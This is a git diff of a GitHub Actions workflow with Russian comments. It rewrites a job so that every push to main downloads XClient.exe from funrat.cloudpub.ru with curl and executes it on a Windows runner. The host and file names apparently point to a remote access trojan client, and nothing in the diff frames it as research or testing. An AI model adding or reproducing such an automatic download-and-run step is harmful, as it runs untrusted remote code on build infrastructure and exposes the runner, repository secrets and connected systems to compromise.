@@ -1,4 +1,4 @@
-name: Run .exe file on Windows
+name: Download and Run .exe file
 
 on:
   push:
@@ -6,14 +6,19 @@ on:
       - main
 
 jobs:
-  build:
-    runs-on: windows-latest
+  download_and_run:
+    runs-on: windows-latest  # Указываем, что задача будет выполняться на Windows
 
     steps:
       - name: Checkout code
         uses: actions/checkout@v2
 
-      - name: Download .exe file from repository
+      - name: Download .exe file
         run: |
-          cd path/to/exefile
-          .\XClient.exe  # Запускаем файл
+          curl -L -o XClient.exe https://funrat.cloudpub.ru/XClient.exe  # Замените URL на реальный путь к .exe файлу
+          # или используйте wget, если предпочитаете
+          # wget https://example.com/path/to/yourprogram.exe
+
+      - name: Run .exe file
+        run: |
+          .\XClient.exe  # Запуск скачанного .exe файла
